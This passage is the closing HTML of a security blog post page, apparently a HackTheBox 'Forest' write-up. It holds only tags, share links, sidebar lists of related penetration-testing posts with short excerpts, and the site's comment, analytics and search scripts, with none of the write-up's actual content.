no-text-decoration" >psexec.py</a> <a href="/tags/golden-ticket/" class="post-tag no-text-decoration" >Golden Ticket</a> <a href="/tags/krbtgt/" class="post-tag no-text-decoration" >krbtgt</a> <a href="/tags/ntpdate/" class="post-tag no-text-decoration" >ntpdate</a> <a href="/tags/ticketer.py/" class="post-tag no-text-decoration" >ticketer.py</a> <a href="/tags/htb-windows-easy/" class="post-tag no-text-decoration" >htb-windows-easy</a> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/oscp-prep/" class="post-tag no-text-decoration" >oscp-prep</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox - Forest - amirr0r&url=https://amirr0r.github.io/posts/htb-forest/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox - Forest - amirr0r&u=https://amirr0r.github.io/posts/htb-forest/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HackTheBox - Forest - amirr0r&url=https://amirr0r.github.io/posts/htb-forest/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/crto-review/">CRTO Review (Certified Red Team Operator) & Notion Templates</a></li><li><a href="/posts/htb-forest/">HackTheBox - Forest</a></li><li><a href="/posts/oscp-review/">OSCP Review (Cheat Sheet, Tmux Enumeration Scripts and Notion Templates)</a></li><li><a href="/posts/oscp-prep/">How do I prepare for the OSCP?</a></li><li><a href="/posts/htb-valentine/">HackTheBox - Valentine</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/msfvenom/">msfvenom</a> <a class="post-tag" href="/tags/sudo-misconfiguration/">sudo misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">password cracking</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/meterpreter/">meterpreter</a> <a class="post-tag" href="/tags/gobuster/">gobuster</a> <a class="post-tag" href="/tags/gtfobins/">GTFOBins</a> <a class="post-tag" href="/tags/searchsploit/">searchsploit</a> <a class="post-tag" href="/tags/john-the-ripper/">John The Ripper</a> <a class="post-tag" href="/tags/powershell/">powershell</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/thm-attackive-directory/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > May 19, 2021 <i class="unloaded">2021-05-19T08:40:04+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe - Attackive directory</h3><div class="text-muted small"><p> This room from TryHackMe cover attacks against a basic misconfigured Domain Controller via Kerberos enumeration, AS-REP Roasting, Impacket and Evil-WinRM. Setup # Impacket git clone https://githu...</p></div></div></a></div><div class="card"> <a href="/posts/thm-windows-post-exploitation-basics/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Jun 28, 2021 <i class="unloaded">2021-06-28T20:27:55+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe - Windows Post-exploitation basics</h3><div class="text-muted small"><p> This room from TryHackMe cover some basic tools used during Windows Post-exploitation such as PowerView, Bloodhound and mimikatz. # RDP xfreerdp /u:&lt;USER&gt; /p:&lt;PASSWORD&gt; /v:&lt;IP&gt; /...</p></div></div></a></div><div class="card"> <a href="/posts/thm-attacking-kerberos/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Jun 30, 2021 <i class="unloaded">2021-06-30T18:44:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe - Attacking Kerberos</h3><div class="text-muted small"><p> Kerberos (the windows ticket-granting service) can be attacked in multiple ways: Kerberoasting AS-REP Roasting Pass the ticket Golden/Silver Ticket and so on. This room from TryHackMe...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-remote/" class="btn btn-outline-primary"><p>HackTheBox - Remote</p></a> <a href="/posts/htb-buff/" class="btn btn-outline-primary"><p>HackTheBox - Buff</p></a></div><!-- The Disqus lazy loading. Powered by: https://osvaldas.info/lazy-loading-disqus-comments v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT License --><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//amirr0r-github-io.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'https://amirr0r.github.io/posts/htb-forest/'; this.page.identifier = '/posts/htb-forest/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://github.com/amirr0r">amirr0r</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/msfvenom/">msfvenom</a> <a class="post-tag" href="/tags/sudo-misconfiguration/">sudo misconfiguration</a> <a class="post-tag" href="/tags/password-cracking/">password cracking</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/meterpreter/">meterpreter</a> <a class="post-tag" href="/tags/gobuster/">gobuster</a> <a class="post-tag" href="/tags/gtfobins/">GTFOBins</a> <a class="post-tag" href="/tags/searchsploit/">searchsploit</a> <a class="post-tag" href="/tags/john-the-ripper/">John The Ripper</a> <a class="post-tag" href="/tags/powershell/">powershell</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- The GA snippet v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', '', 'auto'); ga('send', 'pageview'); </script> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://amirr0r.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
